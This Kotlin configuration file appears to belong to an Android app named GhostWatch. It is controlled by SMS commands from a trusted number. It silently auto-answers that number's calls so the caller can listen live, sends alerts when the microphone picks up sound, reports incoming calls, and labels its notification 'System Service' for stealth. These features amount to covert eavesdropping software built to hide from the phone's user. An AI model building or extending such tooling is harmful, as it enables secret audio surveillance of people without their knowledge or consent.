package com.ghostwatch.app

/**
 * GhostWatch Configuration
 * Edit these values before building the APK.
 */
object GhostConfig {

    // ── SMS Commands (case-insensitive) ──────────────────────────
    const val CMD_START    = "GHOST ON"
    const val CMD_STOP     = "GHOST OFF"
    const val CMD_STATUS   = "GHOST STATUS"
    const val CMD_CALL_ON  = "CALL ON"
    const val CMD_CALL_OFF = "CALL OFF"

    // ── Trusted phone number ─────────────────────────────────────
    // Only SMS from this number will trigger commands.
    // Set to "" to accept commands from ANY number (less secure).
    // Format: +91XXXXXXXXXX  (with country code)
    const val TRUSTED_NUMBER = "+91XXXXXXXXXX"

    // ── Auto-answer call ─────────────────────────────────────────
    // When GhostWatch is active and you call from TRUSTED_NUMBER,
    // the Delhi phone silently auto-answers so you can listen live.
    // Set to false to disable auto-answer.
    const val AUTO_ANSWER_ENABLED = true

    // Rings before auto-answering (1 = instant, 2-3 = slight delay)
    // A small delay avoids triggering if you accidentally call
    const val AUTO_ANSWER_DELAY_MS = 1500L

    // Delay after answering before attempting to merge into conference
    const val MERGE_DELAY_MS = 3000L

    // ── Sound detection ──────────────────────────────────────────
    // Amplitude threshold (0–32767). Tune this:
    //   800  = very sensitive (whispers, footsteps)
    //   2000 = moderate (talking, movement)
    //   5000 = loud only (shouting, banging)
    const val SOUND_THRESHOLD = 2000

    // Minimum seconds between alert SMS replies (avoid spam)
    const val ALERT_COOLDOWN_SECONDS = 60L

    // How often the mic samples (milliseconds)
    const val SAMPLE_INTERVAL_MS = 500L

    // ── Notification ─────────────────────────────────────────────
    // The foreground service MUST show a notification on Android 8+.
    // To be stealthy: set a boring label that doesn't attract attention.
    const val NOTIFICATION_TITLE   = "System Service"
    const val NOTIFICATION_TEXT    = "Running in background"

    // ── SMS Reply Templates ───────────────────────────────────────
    const val REPLY_ACTIVATED   = "✓ GhostWatch activated. Monitoring started."
    const val REPLY_DEACTIVATED = "✓ GhostWatch deactivated. Monitoring stopped."
    const val REPLY_ALREADY_ON  = "GhostWatch is already active."
    const val REPLY_ALREADY_OFF = "GhostWatch is already inactive."
    const val REPLY_CALL_WATCH_ON  = "✓ Call watch ON. Notifying all calls."
    const val REPLY_CALL_WATCH_OFF = "✓ Call watch OFF."
    fun replyStatus(active: Boolean, battery: Int, alertsSent: Int, uptime: String) =
        "GhostWatch Status\n" +
        "Active: ${if (active) "YES" else "NO"}\n" +
        "Battery: $battery%\n" +
        "Alerts sent: $alertsSent\n" +
        "Uptime: $uptime"
    fun replyAlert(level: Int, time: String) =
        "⚠ SOUND DETECTED\nLevel: $level%\nTime: $time\nLocation: Delhi Flat"
}
